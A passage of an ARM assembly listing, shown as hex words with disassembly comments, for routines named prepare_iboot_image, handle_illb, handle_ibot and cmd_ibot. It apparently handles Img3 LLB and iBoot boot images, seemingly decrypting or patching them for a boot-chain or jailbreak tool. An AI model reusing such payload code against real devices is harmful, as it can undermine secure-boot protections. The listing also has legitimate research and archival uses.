    .word  0xE7DC300D    /* 0D84: ldrb     r3, [ip, sp] */
    .word  0xE7C13008    /* 0D88: strb     r3, [r1, r8] */
    .word  0xE2811001    /* 0D8C: add      r1, r1, #1 */
    .word  0xE151000A    /* 0D90: cmp      r1, sl */
    .word  0xBAFFFFF5    /* 0D94: blt      #0x100d70 */
    .word  0xE3A0E000    /* 0D98: mov      lr, #0 */
    .word  0xE3A0A001    /* 0D9C: mov      sl, #1 */
    .word  0xE5CDE01B    /* 0DA0: strb     lr, [sp, #0x1b] */
    .word  0xE58DA008    /* 0DA4: str      sl, [sp, #8] */
    .word  0xE1A08002    /* 0DA8: mov      r8, r2 */
    .word  0xE59F015C    /* 0DAC: ldr      r0, [pc, #0x15c] */
    .word  0xE59D6014    /* 0DB0: ldr      r6, [sp, #0x14] */
    .word  0xE7950000    /* 0DB4: ldr      r0, [r5, r0] */
    .word  0xE3A04000    /* 0DB8: mov      r4, #0 */
    .word  0xE58D0004    /* 0DBC: str      r0, [sp, #4] */
    .word  0xEA000013    /* 0DC0: b        #0x100e14 */
    .word  0xEBFFFDF5    /* 0DC4: bl       #0x1005a0 */
    .word  0xE59D2014    /* 0DC8: ldr      r2, [sp, #0x14] */
    .word  0xE28B3001    /* 0DCC: add      r3, fp, #1 */
    .word  0xE3570010    /* 0DD0: cmp      r7, #0x10 */
    .word  0xE1A0BA03    /* 0DD4: lsl      fp, r3, #0x14 */
    .word  0xE2873001    /* 0DD8: add      r3, r7, #1 */
    .word  0xE7D4C002    /* 0DDC: ldrb     ip, [r4, r2] */
    .word  0xD59FE130    /* 0DE0: ldrle    lr, [pc, #0x130] */
    .word  0xE0872005    /* 0DE4: add      r2, r7, r5 */
    .word  0xE1A07A03    /* 0DE8: lsl      r7, r3, #0x14 */
    .word  0xE59F3100    /* 0DEC: ldr      r3, [pc, #0x100] */
    .word  0xE1A0BA2B    /* 0DF0: lsr      fp, fp, #0x14 */
    .word  0xE7C2C003    /* 0DF4: strb     ip, [r2, r3] */
    .word  0xE1A00005    /* 0DF8: mov      r0, r5 */
    .word  0xE1A0100B    /* 0DFC: mov      r1, fp */
    .word  0xD7C2C00E    /* 0E00: strble   ip, [r2, lr] */
    .word  0xE2866001    /* 0E04: add      r6, r6, #1 */
    .word  0xE2844001    /* 0E08: add      r4, r4, #1 */
    .word  0xE1A07A27    /* 0E0C: lsr      r7, r7, #0x14 */
    .word  0xEBFFFD86    /* 0E10: bl       #0x100430 */
    .word  0xE59D2004    /* 0E14: ldr      r2, [sp, #4] */
    .word  0xE59DC00C    /* 0E18: ldr      ip, [sp, #0xc] */
    .word  0xE1540002    /* 0E1C: cmp      r4, r2 */
    .word  0xA3A03000    /* 0E20: movge    r3, #0 */
    .word  0xB3A03001    /* 0E24: movlt    r3, #1 */
    .word  0xE156000C    /* 0E28: cmp      r6, ip */
    .word  0x23A03000    /* 0E2C: movhs    r3, #0 */
    .word  0xE3530000    /* 0E30: cmp      r3, #0 */
    .word  0xE1A01007    /* 0E34: mov      r1, r7 */
    .word  0xE1A00005    /* 0E38: mov      r0, r5 */
    .word  0x1AFFFFE0    /* 0E3C: bne      #0x100dc4 */
    .word  0xEA00000C    /* 0E40: b        #0x100e78 */
    .word  0xEBFFFDD5    /* 0E44: bl       #0x1005a0 */
    .word  0xE59DE000    /* 0E48: ldr      lr, [sp] */
    .word  0xE28B3001    /* 0E4C: add      r3, fp, #1 */
    .word  0xE1A0BA03    /* 0E50: lsl      fp, r3, #0x14 */
    .word  0xE25EE001    /* 0E54: subs     lr, lr, #1 */
    .word  0xE58DE000    /* 0E58: str      lr, [sp] */
    .word  0xE1A0BA2B    /* 0E5C: lsr      fp, fp, #0x14 */
    .word  0x11A00005    /* 0E60: movne    r0, r5 */
    .word  0x11A0100B    /* 0E64: movne    r1, fp */
    .word  0x1BFFFD70    /* 0E68: blne     #0x100430 */
    .word  0xE2873001    /* 0E6C: add      r3, r7, #1 */
    .word  0xE1A07A03    /* 0E70: lsl      r7, r3, #0x14 */
    .word  0xE1A07A27    /* 0E74: lsr      r7, r7, #0x14 */
    .word  0xE59D2004    /* 0E78: ldr      r2, [sp, #4] */
    .word  0xE1540002    /* 0E7C: cmp      r4, r2 */
    .word  0xE1A01007    /* 0E80: mov      r1, r7 */
    .word  0xE1A00005    /* 0E84: mov      r0, r5 */
    .word  0xE2844001    /* 0E88: add      r4, r4, #1 */
    .word  0xBAFFFFEC    /* 0E8C: blt      #0x100e44 */
    .word  0xE59D3000    /* 0E90: ldr      r3, [sp] */
    .word  0xE3530000    /* 0E94: cmp      r3, #0 */
    .word  0xC58D6014    /* 0E98: strgt    r6, [sp, #0x14] */
    .word  0xCAFFFF88    /* 0E9C: bgt      #0x100cc4 */
    .word  0xE35A0001    /* 0EA0: cmp      sl, #1 */
    .word  0xE1A01008    /* 0EA4: mov      r1, r8 */
    .word  0xDA00000C    /* 0EA8: ble      #0x100ee0 */
    .word  0xE3A02000    /* 0EAC: mov      r2, #0 */
    .word  0xE28D001B    /* 0EB0: add      r0, sp, #0x1b */
    .word  0xE59DC010    /* 0EB4: ldr      ip, [sp, #0x10] */
    .word  0xE158000C    /* 0EB8: cmp      r8, ip */
    .word  0x2A000006    /* 0EBC: bhs      #0x100edc */
    .word  0xE7D23000    /* 0EC0: ldrb     r3, [r2, r0] */
    .word  0xE7C23001    /* 0EC4: strb     r3, [r2, r1] */
    .word  0xE2822001    /* 0EC8: add      r2, r2, #1 */
    .word  0xE152000A    /* 0ECC: cmp      r2, sl */
    .word  0xE2888001    /* 0ED0: add      r8, r8, #1 */
    .word  0x0A000001    /* 0ED4: beq      #0x100ee0 */
    .word  0xEAFFFFF5    /* 0ED8: b        #0x100eb4 */
    .word  0xE3A08000    /* 0EDC: mov      r8, #0 */
    .word  0xE1A00008    /* 0EE0: mov      r0, r8 */
    .word  0xE28DD02C    /* 0EE4: add      sp, sp, #0x2c */
    .word  0xE8BD8DF0    /* 0EE8: pop      {r4, r5, r6, r7, r8, sl, fp, pc} */
    .word  0x0010256C    /* 0EEC: andseq   r2, r0, ip, ror #10 */
    .word  0x0000D428    /* 0EF0: andeq    sp, r0, r8, lsr #8 */
    .word  0x0000C40C    /* 0EF4: andeq    ip, r0, ip, lsl #8 */
    .word  0x00000FEE    /* 0EF8: andeq    r0, r0, lr, ror #31 */
    .word  0x00008008    /* 0EFC: andeq    r8, r0, r8 */
    .word  0x00008408    /* 0F00: andeq    r8, r0, r8, lsl #8 */
    .word  0x0000D3FA    /* 0F04: strdeq   sp, lr, [r0], -sl */
    .word  0x00000FED    /* 0F08: andeq    r0, r0, sp, ror #31 */
    .word  0x00000FDB    /* 0F0C: ldrdeq   r0, r1, [r0], -fp */
    .word  0x0000D424    /* 0F10: andeq    sp, r0, r4, lsr #8 */
    .word  0x0000D420    /* 0F14: andeq    sp, r0, r0, lsr #8 */
    .word  0x0000D40C    /* 0F18: andeq    sp, r0, ip, lsl #8 */

/* ----- prepare_iboot_image @ 0x0F1C ----- */
prepare_iboot_image:
    .word  0xE92D4DF0    /* 0F1C: push     {r4, r5, r6, r7, r8, sl, fp, lr} */
    .word  0xE24DD02C    /* 0F20: sub      sp, sp, #0x2c */
    .word  0xE28D400C    /* 0F24: add      r4, sp, #0xc */
    .word  0xE1A06000    /* 0F28: mov      r6, r0 */
    .word  0xE3A010AA    /* 0F2C: mov      r1, #0xaa */
    .word  0xE3A02020    /* 0F30: mov      r2, #0x20 */
    .word  0xE1A00004    /* 0F34: mov      r0, r4 */
    .word  0xEBFFFE61    /* 0F38: bl       #0x1008c4 */
    .word  0xE59FA0D8    /* 0F3C: ldr      sl, [pc, #0xd8] */
    .word  0xE596100C    /* 0F40: ldr      r1, [r6, #0xc] */
    .word  0xE1A02004    /* 0F44: mov      r2, r4 */
    .word  0xE2860B02    /* 0F48: add      r0, r6, #0x800 */
    .word  0xE1A0E00F    /* 0F4C: mov      lr, pc */
    .word  0xE59AF000    /* 0F50: ldr      pc, [sl] */
    .word  0xE59FB0C4    /* 0F54: ldr      fp, [pc, #0xc4] */
    .word  0xE59F30C4    /* 0F58: ldr      r3, [pc, #0xc4] */
    .word  0xE3A08000    /* 0F5C: mov      r8, #0 */
    .word  0xE3A00010    /* 0F60: mov      r0, #0x10 */
    .word  0xE1A02004    /* 0F64: mov      r2, r4 */
    .word  0xE58D3008    /* 0F68: str      r3, [sp, #8] */
    .word  0xE59F70B4    /* 0F6C: ldr      r7, [pc, #0xb4] */
    .word  0xE1A03000    /* 0F70: mov      r3, r0 */
    .word  0xE1A01004    /* 0F74: mov      r1, r4 */
    .word  0xE88D0900    /* 0F78: stm      sp, {r8, fp} */
    .word  0xE1A0E00F    /* 0F7C: mov      lr, pc */
    .word  0xE597F000    /* 0F80: ldr      pc, [r7] */
    .word  0xE3A01010    /* 0F84: mov      r1, #0x10 */
    .word  0xE0865001    /* 0F88: add      r5, r6, r1 */
    .word  0xE1A00004    /* 0F8C: mov      r0, r4 */
    .word  0xEBFFFE77    /* 0F90: bl       #0x100974 */
    .word  0xE1A00005    /* 0F94: mov      r0, r5 */
    .word  0xE3A01010    /* 0F98: mov      r1, #0x10 */
    .word  0xEBFFFE74    /* 0F9C: bl       #0x100974 */
    .word  0xE1A00005    /* 0FA0: mov      r0, r5 */
    .word  0xE1A01004    /* 0FA4: mov      r1, r4 */
    .word  0xE3A02010    /* 0FA8: mov      r2, #0x10 */
    .word  0xEBFFFE4C    /* 0FAC: bl       #0x1008e4 */
    .word  0xE1A02004    /* 0FB0: mov      r2, r4 */
    .word  0xE1A00006    /* 0FB4: mov      r0, r6 */
    .word  0xE3A01040    /* 0FB8: mov      r1, #0x40 */
    .word  0xE1A0E00F    /* 0FBC: mov      lr, pc */
    .word  0xE59AF000    /* 0FC0: ldr      pc, [sl] */
    .word  0xE59F3058    /* 0FC4: ldr      r3, [pc, #0x58] */
    .word  0xE3A00010    /* 0FC8: mov      r0, #0x10 */
    .word  0xE1A02004    /* 0FCC: mov      r2, r4 */
    .word  0xE58D3008    /* 0FD0: str      r3, [sp, #8] */
    .word  0xE1A01004    /* 0FD4: mov      r1, r4 */
    .word  0xE1A03000    /* 0FD8: mov      r3, r0 */
    .word  0xE88D0900    /* 0FDC: stm      sp, {r8, fp} */
    .word  0xE1A0E00F    /* 0FE0: mov      lr, pc */
    .word  0xE597F000    /* 0FE4: ldr      pc, [r7] */
    .word  0xE2866040    /* 0FE8: add      r6, r6, #0x40 */
    .word  0xE1A00004    /* 0FEC: mov      r0, r4 */
    .word  0xE3A01010    /* 0FF0: mov      r1, #0x10 */
    .word  0xEBFFFE5E    /* 0FF4: bl       #0x100974 */
    .word  0xE1A00006    /* 0FF8: mov      r0, r6 */
    .word  0xE3A01010    /* 0FFC: mov      r1, #0x10 */
    .word  0xEBFFFE5B    /* 1000: bl       #0x100974 */
    .word  0xE1A00006    /* 1004: mov      r0, r6 */
    .word  0xE1A01004    /* 1008: mov      r1, r4 */
    .word  0xE3A02010    /* 100C: mov      r2, #0x10 */
    .word  0xEBFFFE33    /* 1010: bl       #0x1008e4 */
    .word  0xE28DD02C    /* 1014: add      sp, sp, #0x2c */
    .word  0xE8BD8DF0    /* 1018: pop      {r4, r5, r6, r7, r8, sl, fp, pc} */
    .word  0x0010253C    /* 101C: andseq   r2, r0, ip, lsr r5 */
    .word  0x001024C0    /* 1020: andseq   r2, r0, r0, asr #9 */
    .word  0x00102524    /* 1024: andseq   r2, r0, r4, lsr #10 */
    .word  0x00102520    /* 1028: andseq   r2, r0, r0, lsr #10 */

/* ----- handle_illb @ 0x102C ----- */
handle_illb:
    .word  0xE92D45F0    /* 102C: push     {r4, r5, r6, r7, r8, sl, lr} */
    .word  0xE59FA11C    /* 1030: ldr      sl, [pc, #0x11c] */
    .word  0xE24DD018    /* 1034: sub      sp, sp, #0x18 */
    .word  0xE1A05000    /* 1038: mov      r5, r0 */
    .word  0xEBFFFEA8    /* 103C: bl       #0x100ae4 */
    .word  0xE59A3000    /* 1040: ldr      r3, [sl] */
    .word  0xE5934008    /* 1044: ldr      r4, [r3, #8] */
    .word  0xE3A07906    /* 1048: mov      r7, #0x18000 */
    .word  0xE595601C    /* 104C: ldr      r6, [r5, #0x1c] */
    .word  0xE5958024    /* 1050: ldr      r8, [r5, #0x24] */
    .word  0xE3A03000    /* 1054: mov      r3, #0 */
    .word  0xE58D7000    /* 1058: str      r7, [sp] */
    .word  0xE1A00005    /* 105C: mov      r0, r5 */
    .word  0xE1A01004    /* 1060: mov      r1, r4 */
    .word  0xE3A02902    /* 1064: mov      r2, #0x8000 */
    .word  0xE1A0E00F    /* 1068: mov      lr, pc */
    .word  0xE12FFF16    /* 106C: bx       r6 */
    .word  0xE5D43900    /* 1070: ldrb     r3, [r4, #0x900] */
    .word  0xE3530046    /* 1074: cmp      r3, #0x46 */
    .word  0x0A000033    /* 1078: beq      #0x10114c */
    .word  0xE1A00004    /* 107C: mov      r0, r4 */
    .word  0xEBFFFFA5    /* 1080: bl       #0x100f1c */
    .word  0xE3A03046    /* 1084: mov      r3, #0x46 */
    .word  0xE5C43900    /* 1088: strb     r3, [r4, #0x900] */
    .word  0xE2840B02    /* 108C: add      r0, r4, #0x800 */
    .word  0xEBFFFDD2    /* 1090: bl       #0x1007e0 */
    .word  0xE1A00004    /* 1094: mov      r0, r4 */
    .word  0xEBFFFF9F    /* 1098: bl       #0x100f1c */
    .word  0xE1A01004    /* 109C: mov      r1, r4 */
    .word  0xE3A02902    /* 10A0: mov      r2, #0x8000 */
    .word  0xE3A03000    /* 10A4: mov      r3, #0 */
    .word  0xE58D7000    /* 10A8: str      r7, [sp] */
    .word  0xE1A00005    /* 10AC: mov      r0, r5 */
    .word  0xE1A0E00F    /* 10B0: mov      lr, pc */
    .word  0xE12FFF18    /* 10B4: bx       r8 */
    .word  0xE3A03014    /* 10B8: mov      r3, #0x14 */
    .word  0xE58D3000    /* 10BC: str      r3, [sp] */
    .word  0xE3A02802    /* 10C0: mov      r2, #0x20000 */
    .word  0xE3A03000    /* 10C4: mov      r3, #0 */
    .word  0xE1A00005    /* 10C8: mov      r0, r5 */
    .word  0xE28D1004    /* 10CC: add      r1, sp, #4 */
    .word  0xE1A0E00F    /* 10D0: mov      lr, pc */
    .word  0xE12FFF16    /* 10D4: bx       r6 */
    .word  0xE59D2004    /* 10D8: ldr      r2, [sp, #4] */
    .word  0xE59F3074    /* 10DC: ldr      r3, [pc, #0x74] */
    .word  0xE1520003    /* 10E0: cmp      r2, r3 */
    .word  0x1A000018    /* 10E4: bne      #0x10114c */
    .word  0xE59A3000    /* 10E8: ldr      r3, [sl] */
    .word  0xE5934008    /* 10EC: ldr      r4, [r3, #8] */
    .word  0xE59D3008    /* 10F0: ldr      r3, [sp, #8] */
    .word  0xE2844802    /* 10F4: add      r4, r4, #0x20000 */
    .word  0xE1A01004    /* 10F8: mov      r1, r4 */
    .word  0xE3A02802    /* 10FC: mov      r2, #0x20000 */
    .word  0xE58D3000    /* 1100: str      r3, [sp] */
    .word  0xE1A00005    /* 1104: mov      r0, r5 */
    .word  0xE3A03000    /* 1108: mov      r3, #0 */
    .word  0xE1A0E00F    /* 110C: mov      lr, pc */
    .word  0xE12FFF16    /* 1110: bx       r6 */
    .word  0xE1A00004    /* 1114: mov      r0, r4 */
    .word  0xEBFFFE16    /* 1118: bl       #0x100978 */
    .word  0xE59F3038    /* 111C: ldr      r3, [pc, #0x38] */
    .word  0xE2840040    /* 1120: add      r0, r4, #0x40 */
    .word  0xE5843241    /* 1124: str      r3, [r4, #0x241] */
    .word  0xEBFFFDAC    /* 1128: bl       #0x1007e0 */
    .word  0xE59D3008    /* 112C: ldr      r3, [sp, #8] */
    .word  0xE1A00005    /* 1130: mov      r0, r5 */
    .word  0xE58D3000    /* 1134: str      r3, [sp] */
    .word  0xE1A01004    /* 1138: mov      r1, r4 */
    .word  0xE3A02802    /* 113C: mov      r2, #0x20000 */
    .word  0xE3A03000    /* 1140: mov      r3, #0 */
    .word  0xE1A0E00F    /* 1144: mov      lr, pc */
    .word  0xE12FFF18    /* 1148: bx       r8 */
    .word  0xE28DD018    /* 114C: add      sp, sp, #0x18 */
    .word  0xE8BD85F0    /* 1150: pop      {r4, r5, r6, r7, r8, sl, pc} */
    .word  0x0010256C    /* 1154: andseq   r2, r0, ip, ror #10 */
    .word  0x496D6733    /* 1158: stmdbmi  sp!, {r0, r1, r4, r5, r8, sb, sl, sp, lr} ^ */
    .word  0x6E696152    /* 115C: mcrvs    p1, #3, r6, c9, c2, #2 */

/* ----- handle_ibot @ 0x1160 ----- */
handle_ibot:
    .word  0xE92D4DF0    /* 1160: push     {r4, r5, r6, r7, r8, sl, fp, lr} */
    .word  0xE251A000    /* 1164: subs     sl, r1, #0 */
    .word  0xE24DD018    /* 1168: sub      sp, sp, #0x18 */
    .word  0xE1A06000    /* 116C: mov      r6, r0 */
    .word  0x0A000003    /* 1170: beq      #0x101184 */
    .word  0xE59F11EC    /* 1174: ldr      r1, [pc, #0x1ec] */
    .word  0xE59F01EC    /* 1178: ldr      r0, [pc, #0x1ec] */
    .word  0xEBFFFDEE    /* 117C: bl       #0x10093c */
    .word  0xEA000002    /* 1180: b        #0x101190 */
    .word  0xE59F01E0    /* 1184: ldr      r0, [pc, #0x1e0] */
    .word  0xE59F11E0    /* 1188: ldr      r1, [pc, #0x1e0] */
    .word  0xEBFFFDEA    /* 118C: bl       #0x10093c */
    .word  0xE3500000    /* 1190: cmp      r0, #0 */
    .word  0x1A000071    /* 1194: bne      #0x101360 */
    .word  0xE59F31D4    /* 1198: ldr      r3, [pc, #0x1d4] */
    .word  0xE5933000    /* 119C: ldr      r3, [r3] */
    .word  0xE5935008    /* 11A0: ldr      r5, [r3, #8] */
    .word  0xE3A01000    /* 11A4: mov      r1, #0 */
    .word  0xE1A00005    /* 11A8: mov      r0, r5 */
    .word  0xE3A02601    /* 11AC: mov      r2, #0x100000 */
    .word  0xEBFFFDC3    /* 11B0: bl       #0x1008c4 */
    .word  0xE596801C    /* 11B4: ldr      r8, [r6, #0x1c] */
    .word  0xE596B024    /* 11B8: ldr      fp, [r6, #0x24] */
    .word  0xE3A07902    /* 11BC: mov      r7, #0x8000 */
    .word  0xE3A03014    /* 11C0: mov      r3, #0x14 */
    .word  0xE58D3000    /* 11C4: str      r3, [sp] */
    .word  0xE28D1004    /* 11C8: add      r1, sp, #4 */
    .word  0xE3A03000    /* 11CC: mov      r3, #0 */
    .word  0xE1A00006    /* 11D0: mov      r0, r6 */
    .word  0xE1A02007    /* 11D4: mov      r2, r7 */
    .word  0xE1A0E00F    /* 11D8: mov      lr, pc */
    .word  0xE12FFF18    /* 11DC: bx       r8 */
    .word  0xE59D3004    /* 11E0: ldr      r3, [sp, #4] */
    .word  0xE59F118C    /* 11E4: ldr      r1, [pc, #0x18c] */
    .word  0xE1530001    /* 11E8: cmp      r3, r1 */
    .word  0x1A000051    /* 11EC: bne      #0x101338 */
    .word  0xE59D2008    /* 11F0: ldr      r2, [sp, #8] */
    .word  0xE59F3180    /* 11F4: ldr      r3, [pc, #0x180] */
    .word  0xE1520003    /* 11F8: cmp      r2, r3 */
    .word  0x1A000003    /* 11FC: bne      #0x101210 */
    .word  0xE59D3014    /* 1200: ldr      r3, [sp, #0x14] */
    .word  0xE59F1174    /* 1204: ldr      r1, [pc, #0x174] */
    .word  0xE1530001    /* 1208: cmp      r3, r1 */
    .word  0x0A000053    /* 120C: beq      #0x101360 */
    .word  0xE58D2000    /* 1210: str      r2, [sp] */
    .word  0xE3A03000    /* 1214: mov      r3, #0 */
    .word  0xE1A02007    /* 1218: mov      r2, r7 */
    .word  0xE1A00006    /* 121C: mov      r0, r6 */
    .word  0xE1A01005    /* 1220: mov      r1, r5 */
    .word  0xE1A0E00F    /* 1224: mov      lr, pc */
    .word  0xE12FFF18    /* 1228: bx       r8 */
    .word  0xE59D3014    /* 122C: ldr      r3, [sp, #0x14] */
    .word  0xE59F2148    /* 1230: ldr      r2, [pc, #0x148] */
    .word  0xE1530002    /* 1234: cmp      r3, r2 */
    .word  0x1A00001B    /* 1238: bne      #0x1012ac */
    .word  0xE1A00005    /* 123C: mov      r0, r5 */
    .word  0xEBFFFDCC    /* 1240: bl       #0x100978 */
    .word  0xE59F3130    /* 1244: ldr      r3, [pc, #0x130] */
    .word  0xE35A0000    /* 1248: cmp      sl, #0 */
    .word  0xE5853004    /* 124C: str      r3, [r5, #4] */
    .word  0xE59F112C    /* 1250: ldr      r1, [pc, #0x12c] */
    .word  0x159F312C    /* 1254: ldrne    r3, [pc, #0x12c] */
    .word  0xE5851008    /* 1258: str      r1, [r5, #8] */
    .word  0x15932000    /* 125C: ldrne    r2, [r3] */
    .word  0x159F1124    /* 1260: ldrne    r1, [pc, #0x124] */
    .word  0x159F3124    /* 1264: ldrne    r3, [pc, #0x124] */
    .word  0x059F3124    /* 1268: ldreq    r3, [pc, #0x124] */
    .word  0x15851048    /* 126C: strne    r1, [r5, #0x48] */
    .word  0x15823000    /* 1270: strne    r3, [r2] */
    .word  0xE59F211C    /* 1274: ldr      r2, [pc, #0x11c] */
    .word  0x05853048    /* 1278: streq    r3, [r5, #0x48] */
    .word  0xE5921000    /* 127C: ldr      r1, [r2] */
    .word  0xE2850802    /* 1280: add      r0, r5, #0x20000 */
    .word  0xE3A02040    /* 1284: mov      r2, #0x40 */
    .word  0xEBFFFD95    /* 1288: bl       #0x1008e4 */
    .word  0xE35A0000    /* 128C: cmp      sl, #0 */
    .word  0xE2850909    /* 1290: add      r0, r5, #0x24000 */
    .word  0x059F1100    /* 1294: ldreq    r1, [pc, #0x100] */
    .word  0x159F1100    /* 1298: ldrne    r1, [pc, #0x100] */
    .word  0xE3A02C02    /* 129C: mov      r2, #0x200 */
    .word  0xEBFFFD8F    /* 12A0: bl       #0x1008e4 */
    .word  0xE2850040    /* 12A4: add      r0, r5, #0x40 */
    .word  0xEBFFFD4C    /* 12A8: bl       #0x1007e0 */
    .word  0xE59D2014    /* 12AC: ldr      r2, [sp, #0x14] */
    .word  0xE59F30EC    /* 12B0: ldr      r3, [pc, #0xec] */
    .word  0xE1520003    /* 12B4: cmp      r2, r3 */
    .word  0x1A000005    /* 12B8: bne      #0x1012d4 */
    .word  0xE1A00005    /* 12BC: mov      r0, r5 */
    .word  0xEBFFFDAC    /* 12C0: bl       #0x100978 */
    .word  0xE59F30DC    /* 12C4: ldr      r3, [pc, #0xdc] */
    .word  0xE2850040    /* 12C8: add      r0, r5, #0x40 */
    .word  0xE5853241    /* 12CC: str      r3, [r5, #0x241] */
    .word  0xEBFFFD42    /* 12D0: bl       #0x1007e0 */
    .word  0xE59D0014    /* 12D4: ldr      r0, [sp, #0x14] */
    .word  0xE59F30CC    /* 12D8: ldr      r3, [pc, #0xcc] */
    .word  0xE1500003    /* 12DC: cmp      r0, r3 */
    .word  0x1A00000F    /* 12E0: bne      #0x101324 */
    .word  0xE59F30C4    /* 12E4: ldr      r3, [pc, #0xc4] */
    .word  0xE3A01002    /* 12E8: mov      r1, #2 */
    .word  0xE1A0E00F    /* 12EC: mov      lr, pc */
    .word  0xE593F000    /* 12F0: ldr      pc, [r3] */
    .word  0xE5904014    /* 12F4: ldr      r4, [r0, #0x14] */
    .word  0xE3A01020    /* 12F8: mov      r1, #0x20 */
    .word  0xEBFFFD9C    /* 12FC: bl       #0x100974 */
    .word  0xE1A00004    /* 1300: mov      r0, r4 */
    .word  0xE3A01020    /* 1304: mov      r1, #0x20 */
    .word  0xEBFFFD99    /* 1308: bl       #0x100974 */
    .word  0xE59F3060    /* 130C: ldr      r3, [pc, #0x60] */
    .word  0xE5933000    /* 1310: ldr      r3, [r3] */
    .word  0xE5933008    /* 1314: ldr      r3, [r3, #8] */
    .word  0xE2633902    /* 1318: rsb      r3, r3, #0x8000 */
    .word  0xE0833005    /* 131C: add      r3, r3, r5 */
    .word  0xE584300C    /* 1320: str      r3, [r4, #0xc] */
    .word  0xE5952004    /* 1324: ldr      r2, [r5, #4] */
    .word  0xE59D3008    /* 1328: ldr      r3, [sp, #8] */
    .word  0xE0855002    /* 132C: add      r5, r5, r2 */
    .word  0xE0877003    /* 1330: add      r7, r7, r3 */
    .word  0xEAFFFFA1    /* 1334: b        #0x1011c0 */
    .word  0xE59F3034    /* 1338: ldr      r3, [pc, #0x34] */
    .word  0xE5933000    /* 133C: ldr      r3, [r3] */
    .word  0xE5931008    /* 1340: ldr      r1, [r3, #8] */
    .word  0xE0613005    /* 1344: rsb      r3, r1, r5 */
    .word  0xE58D3000    /* 1348: str      r3, [sp] */
    .word  0xE1A00006    /* 134C: mov      r0, r6 */
    .word  0xE3A02902    /* 1350: mov      r2, #0x8000 */
    .word  0xE3A03000    /* 1354: mov      r3, #0 */
    .word  0xE1A0E00F    /* 1358: mov      lr, pc */
    .word  0xE12FFF1B    /* 135C: bx       fp */
    .word  0xE28DD018    /* 1360: add      sp, sp, #0x18 */
    .word  0xE8BD8DF0    /* 1364: pop      {r4, r5, r6, r7, r8, sl, fp, pc} */
    .word  0x00101D38    /* 1368: andseq   r1, r0, r8, lsr sp */
    .word  0x00102558    /* 136C: andseq   r2, r0, r8, asr r5 */
    .word  0x00101D44    /* 1370: andseq   r1, r0, r4, asr #26 */
    .word  0x0010256C    /* 1374: andseq   r2, r0, ip, ror #10 */
    .word  0x496D6733    /* 1378: stmdbmi  sp!, {r0, r1, r4, r5, r8, sb, sl, sp, lr} ^ */
    .word  0x00024200    /* 137C: andeq    r4, r2, r0, lsl #4 */
    .word  0x696C6C62    /* 1380: stmdbvs  ip!, {r1, r5, r6, sl, fp, sp, lr} ^ */
    .word  0x000241EC    /* 1384: andeq    r4, r2, ip, ror #3 */
    .word  0x00100244    /* 1388: andseq   r0, r0, r4, asr #4 */
    .word  0x22020005    /* 138C: andhs    r0, r2, #5 */
    .word  0x00003339    /* 1390: andeq    r3, r0, sb, lsr r3 */
    .word  0x84020005    /* 1394: strhi    r0, [r2], #-5 */
    .word  0x00100240    /* 1398: andseq   r0, r0, r0, asr #4 */
    .word  0x00102190    /* 139C: mulseq   r0, r0, r1 */
    .word  0x00101D90    /* 13A0: mulseq   r0, r0, sp */
    .word  0x69626F74    /* 13A4: stmdbvs  r2!, {r2, r4, r5, r6, r8, sb, sl, fp, sp, lr} ^ */
    .word  0x6E696152    /* 13A8: mcrvs    p1, #3, r6, c9, c2, #2 */
    .word  0x64747265    /* 13AC: ldrbtvs  r7, [r4], #-0x265 */
    .word  0x00102548    /* 13B0: andseq   r2, r0, r8, asr #10 */

/* ----- cmd_ibot @ 0x13B4 ----- */
cmd_ibot:
    .word  0xE92D4030    /* 13B4: push     {r4, r5, lr} */
    .word  0xE59F50F4    /* 13B8: ldr      r5, [pc, #0xf4] */
    .word  0xE595C000    /* 13BC: ldr      ip, [r5] */
    .word  0xE59F40F0    /* 13C0: ldr      r4, [pc, #0xf0] */
    .word  0xE59F30F0    /* 13C4: ldr      r3, [pc, #0xf0] */
    .word  0xE59C2008    /* 13C8: ldr      r2, [ip, #8] */
    .word  0xE5941000    /* 13CC: ldr      r1, [r4] */
    .word  0xE5930000    /* 13D0: ldr      r0, [r3] */
    .word  0xE2822403    /* 13D4: add      r2, r2, #0x3000000 */
    .word  0xE3A03712    /* 13D8: mov      r3, #0x480000 */
    .word  0xE5812000    /* 13DC: str      r2, [r1] */
    .word  0xE5803000    /* 13E0: str      r3, [r0] */
    .word  0xE3A02702    /* 13E4: mov      r2, #0x80000 */
    .word  0xE5910000    /* 13E8: ldr      r0, [r1] */
    .word  0xE59C1008    /* 13EC: ldr      r1, [ip, #8] */
    .word  0xEBFFFD3B    /* 13F0: bl       #0x1008e4 */
    .word  0xE5943000    /* 13F4: ldr      r3, [r4] */
    .word  0xE5930000    /* 13F8: ldr      r0, [r3] */
    .word  0xE59F10BC    /* 13FC: ldr      r1, [pc, #0xbc] */
    .word  0xE2800702    /* 1400: add      r0, r0, #0x80000 */
    .word  0xEBFFFD42    /* 1404: bl       #0x100914 */
    .word  0xE5953000    /* 1408: ldr      r3, [r5] */
    .word  0xE3A02008    /* 140C: mov      r2, #8 */
    .word  0xE5931000    /* 1410: ldr      r1, [r3] */
    .word  0xE59F00A8    /* 1414: ldr      r0, [pc, #0xa8] */
    .word  0xEBFFFCA8    /* 1418: bl       #0x1006c0 */
    .word  0xE59F30A4    /* 141C: ldr      r3, [pc, #0xa4] */
    .word  0xE2802001    /* 1420: add      r2, r0, #1 */
    .word  0xE5832000    /* 1424: str      r2, [r3] */
    .word  0xE3A01002    /* 1428: mov      r1, #2 */
    .word  0xE59F0098    /* 142C: ldr      r0, [pc, #0x98] */
    .word  0xE1A0E00F    /* 1430: mov      lr, pc */
    .word  0xE12FFF12    /* 1434: bx       r2 */
    .word  0xE5903014    /* 1438: ldr      r3, [r0, #0x14] */
    .word  0xE5934008    /* 143C: ldr      r4, [r3, #8] */
    .word  0xE3A01040    /* 1440: mov      r1, #0x40 */
    .word  0xE1A00004    /* 1444: mov      r0, r4 */
    .word  0xEBFFFD49    /* 1448: bl       #0x100974 */
    .word  0xE59F307C    /* 144C: ldr      r3, [pc, #0x7c] */
    .word  0xE5931000    /* 1450: ldr      r1, [r3] */
    .word  0xE3510000    /* 1454: cmp      r1, #0 */
    .word  0x1A000007    /* 1458: bne      #0x10147c */
    .word  0xE5D43031    /* 145C: ldrb     r3, [r4, #0x31] */
    .word  0xE3530061    /* 1460: cmp      r3, #0x61 */
    .word  0x11A00004    /* 1464: movne    r0, r4 */
    .word  0x1A00000C    /* 1468: bne      #0x1014a0 */
    .word  0xE59F3060    /* 146C: ldr      r3, [pc, #0x60] */
    .word  0xE3A02001    /* 1470: mov      r2, #1 */
